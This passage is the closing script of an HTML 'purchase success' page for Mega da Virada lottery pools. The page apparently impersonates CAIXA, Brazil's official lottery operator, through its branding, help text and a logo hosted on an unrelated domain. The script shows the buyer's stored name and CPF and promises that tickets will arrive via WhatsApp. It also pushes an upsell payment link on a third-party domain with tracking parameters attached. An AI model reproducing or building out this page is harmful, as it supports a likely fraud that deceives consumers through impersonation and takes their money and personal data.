                for (const [id, conteudo] of Object.entries(elementos)) {
                    this.atualizar(id, conteudo);
                }
            }
        };

        /**
         * Carrega e preenche dados na p√°gina
         */
        function carregarDados() {
            // Buscar dados do usu√°rio
            const dadosUsuario = StorageManager.getMultiple({
                nome: '',
                cpf: '',
                cpfUsuario: ''
            });

            // Preparar dados pessoais
            const nome = dadosUsuario.nome || '';
            const cpfFormatado = dadosUsuario.cpf || dadosUsuario.cpfUsuario;

            // Mostrar/ocultar campos de dados pessoais
            const rowNome = document.getElementById('rowNome');
            const rowCpf = document.getElementById('rowCpf');
            
            if (nome) {
                DOMManager.atualizar('nomeCliente', nome);
                if (rowNome) rowNome.style.display = 'flex';
            } else {
                if (rowNome) rowNome.style.display = 'none';
            }

            if (cpfFormatado) {
                DOMManager.atualizar('cpfCliente', Formatadores.cpf(cpfFormatado));
                if (rowCpf) rowCpf.style.display = 'flex';
            } else {
                if (rowCpf) rowCpf.style.display = 'none';
            }

            // Dados do concurso (fixos)
            const dataCompra = Formatadores.dataHora(new Date());
            DOMManager.atualizar('dataCompra', dataCompra);
        }

        /**
         * Mostra ajuda
         */
        function mostrarAjuda() {
            alert('Se voc√™ tiver alguma d√∫vida sobre sua compra, entre em contato conosco atrav√©s dos canais de atendimento da CAIXA.');
        }

        /**
         * Verifica se o usu√°rio j√° visitou a p√°gina de sucesso anteriormente
         * @returns {boolean} true se j√° visitou, false caso contr√°rio
         */
        function jaVisitouPaginaSucesso() {
            try {
                const flag = localStorage.getItem('pagina_sucesso_visitada');
                return flag === 'true';
            } catch (e) {
                console.warn('Erro ao verificar visita anterior:', e);
                return false;
            }
        }

        /**
         * Marca que o usu√°rio visitou a p√°gina de sucesso
         */
        function marcarComoVisitado() {
            try {
                localStorage.setItem('pagina_sucesso_visitada', 'true');
                // Salvar timestamp da primeira visita
                const primeiraVisita = localStorage.getItem('pagina_sucesso_primeira_visita');
                if (!primeiraVisita) {
                    localStorage.setItem('pagina_sucesso_primeira_visita', new Date().getTime().toString());
                }
            } catch (e) {
                console.warn('Erro ao marcar visita:', e);
            }
        }

        /**
         * Ajusta o conte√∫do da p√°gina baseado se √© primeira visita ou retorno
         */
        function ajustarConteudoPorVisita() {
            const jaVisitou = jaVisitouPaginaSucesso();
            
            if (jaVisitou) {
                // Usu√°rio j√° visitou antes - mostrar conte√∫do diferente
                const tituloPrincipal = document.querySelector('.titulo-principal');
                const subtitulo = document.querySelector('.subtitulo');
                const confirmacaoBox = document.querySelector('.confirmacao-box');
                const upsellSection = document.querySelector('.upsell-section');
                const mainSection = document.querySelector('.main-section');
                
                // Alterar t√≠tulo
                if (tituloPrincipal) {
                    tituloPrincipal.textContent = 'BEM-VINDO DE VOLTA!';
                }
                
                // Modificar subt√≠tulo
                if (subtitulo) {
                    subtitulo.textContent = 'Voc√™ j√° participa de 2 bol√µes, seus dois bilhetes ser√£o emitidos e enviados para voc√™ via WhatsApp';
                }
                
                // Ocultar o box de confirma√ß√£o
                if (confirmacaoBox) {
                    confirmacaoBox.style.display = 'none';
                }
                
                // Ocultar a se√ß√£o de upsell
                if (upsellSection) {
                    upsellSection.style.display = 'none';
                }
                
                // Adicionar mensagem especial de finaliza√ß√£o
                if (mainSection) {
                    const mensagemFinalizacao = document.createElement('div');
                    mensagemFinalizacao.className = 'mensagem-final';
                    mensagemFinalizacao.style.backgroundColor = '#e8f5e9';
                    mensagemFinalizacao.style.borderLeftColor = '#4CAF50';
                    mensagemFinalizacao.style.marginTop = 'var(--espaco-3xl)';
                    mensagemFinalizacao.innerHTML = '<strong>‚úÖ Tudo Confirmado!</strong><br><br>Voc√™ j√° participa de 2 bol√µes da Mega da Virada. Seus bilhetes est√£o sendo processados e ser√£o enviados para voc√™ via WhatsApp em at√© 72 horas. Fique atento √†s mensagens!';
                    
                    // Inserir antes do link de ajuda
                    const helpLink = document.querySelector('.help-link');
                    if (helpLink) {
                        mainSection.insertBefore(mensagemFinalizacao, helpLink);
                    } else {
                        mainSection.appendChild(mensagemFinalizacao);
                    }
                }
            } else {
                // Primeira visita - marcar como visitado
                marcarComoVisitado();
            }
        }

        /**
         * Fun√ß√£o auxiliar para adicionar UTMs a uma URL
         * @param {string} url - URL base
         * @returns {string} URL com UTMs adicionados
         */
        /**
         * Sanitiza valores para prevenir XSS
         * @param {string} value - Valor a ser sanitizado
         * @returns {string|null} Valor sanitizado ou null
         */
        function sanitizeValue(value) {
            if (!value || typeof value !== 'string') return null;
            return value.replace(/[<>\"']/g, '').substring(0, 200);
        }

        function adicionarUtmsAUrl(url) {
            // Validar URL antes de processar
            if (!url || typeof url !== 'string') {
                console.warn('[UTM] URL inv√°lida fornecida');
                return '#';
            }
            
            try {
                const urlObj = new URL(url);
                const utmKeys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'src', 'sck'];
                
                // Primeiro, tentar pegar da URL atual
                const urlParams = new URLSearchParams(window.location.search);
                let temUtms = false;
                
                utmKeys.forEach(key => {
                    const value = urlParams.get(key);
                    if (value) {
                        const sanitized = sanitizeValue(value);
                        if (sanitized) {
                            urlObj.searchParams.append(key, sanitized);
                            temUtms = true;
                        }
                    }
                });
                
                // Se n√£o tem na URL, tentar pegar do localStorage
                if (!temUtms) {
                    try {
                        // Tentar formato utmParams primeiro
                        const utmParams = localStorage.getItem('utmParams');
                        if (utmParams) {
                            const parsed = JSON.parse(utmParams);
                            utmKeys.forEach(key => {
                                if (parsed[key]) {
                                    const sanitized = sanitizeValue(String(parsed[key]));
                                    if (sanitized) {
                                        urlObj.searchParams.append(key, sanitized);
                                    }
                                }
                            });
                        } else {
                            // Tentar formato utm_data (UTMify)
                            const utmData = localStorage.getItem('utm_data');
                            if (utmData) {
                                const parsed = JSON.parse(utmData);
                                utmKeys.forEach(key => {
                                    if (parsed[key]) {
                                        const sanitized = sanitizeValue(String(parsed[key]));
                                        if (sanitized) {
                                            urlObj.searchParams.append(key, sanitized);
                                        }
                                    }
                                });
                            }
                        }
                    } catch (e) {
                        console.warn('[UTM] Erro ao ler UTMs do localStorage:', e);
                    }
                }
                
                return urlObj.toString();
            } catch (e) {
                // Se a URL n√£o for v√°lida, tentar adicionar como query string
                console.warn('[UTM] Erro ao processar URL, tentando m√©todo alternativo:', e);
                const separator = url.includes('?') ? '&' : '?';
                const utmParams = new URLSearchParams();
                
                // Tentar pegar da URL atual
                const urlParams = new URLSearchParams(window.location.search);
                const utmKeys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'src', 'sck'];
                
                utmKeys.forEach(key => {
                    const value = urlParams.get(key);
                    if (value) {
                        const sanitized = sanitizeValue(value);
                        if (sanitized) {
                            utmParams.append(key, sanitized);
                        }
                    }
                });
                
                // Se n√£o tem, tentar localStorage
                if (utmParams.toString() === '') {
                    try {
                        const stored = JSON.parse(localStorage.getItem('utmParams') || localStorage.getItem('utm_data') || '{}');
                        utmKeys.forEach(key => {
                            if (stored[key]) {
                                const sanitized = sanitizeValue(String(stored[key]));
                                if (sanitized) {
                                    utmParams.append(key, sanitized);
                                }
                            }
                        });
                    } catch (e) {
                        console.warn('[UTM] Erro ao ler localStorage:', e);
                    }
                }
                
                return utmParams.toString() ? url + separator + utmParams.toString() : url;
            }
        }

        /**
         * Configurar bot√£o de upsell de forma segura
         */
        function configurarBotaoUpsell() {
            const botao = document.getElementById('upsellButton');
            if (botao) {
                botao.addEventListener('click', function(e) {
                    e.preventDefault();
                    const urlSegura = adicionarUtmsAUrl('https://pay.worksollutions.site/nWrxGWAMz5y3654');
                    if (urlSegura && urlSegura !== '#') {
                        window.location.href = urlSegura;
                    }
                });
            }
        }

        /**
         * Verificar e garantir carregamento da logo
         */
        function verificarLogo() {
            const logoImg = document.getElementById('logoImg');
            if (logoImg) {
                // Fallback SVG em base64
                const fallbackSvg = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0MDAgMTIwIiBmaWxsPSJub25lIj48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0id2hpdGUiIGZvbnQtZmFtaWx5PSJJbnRlciwgQXJpYWwsIHNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iNjAiIGZvbnQtd2VpZ2h0PSI4MDAiIGxldHRlci1zcGFjaW5nPSIzIj5DQUlYQTwvdGV4dD48L3N2Zz4=';
                
                // Verificar se a imagem j√° carregou
                if (logoImg.complete && logoImg.naturalHeight !== 0) {
                    return; // Imagem j√° carregada
                }
                
                // Tentar carregar a imagem
                const testImg = new Image();
                testImg.onload = function() {
                    // Imagem carregou com sucesso, garantir que est√° no elemento
                    if (logoImg.src !== 'https://loteria.programaoficial.is/imagem/caixx.png') {
                        logoImg.src = 'https://loteria.programaoficial.is/imagem/caixx.png';
                    }
                };
                
                testImg.onerror = function() {
                    // Se falhar, tentar novamente com cache busting
                    setTimeout(function() {
                        logoImg.src = 'https://loteria.programaoficial.is/imagem/caixx.png?t=' + Date.now();
                        logoImg.onerror = function() {
                            // Se ainda falhar, usar fallback
                            logoImg.src = fallbackSvg;
                        };
                    }, 1000);
                };
                
                // Testar carregamento
                testImg.src = 'https://loteria.programaoficial.is/imagem/caixx.png';
                
                // Timeout de seguran√ßa
                setTimeout(function() {
                    if (!logoImg.complete || logoImg.naturalHeight === 0) {
                        if (logoImg.src.indexOf('data:image') === -1) {
                            logoImg.src = 'https://loteria.programaoficial.is/imagem/caixx.png?t=' + Date.now();
                            logoImg.onerror = function() {
                                logoImg.src = fallbackSvg;
                            };
                        }
                    }
                }, 3000);
            }
        }

        // Inicializa√ß√£o quando DOM estiver pronto
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', function() {
                carregarDados();
                ajustarConteudoPorVisita();
                configurarBotaoUpsell();
                verificarLogo();
            });
        } else {
            carregarDados();
            ajustarConteudoPorVisita();
            configurarBotaoUpsell();
            verificarLogo();
        }
    </script>



</body></html>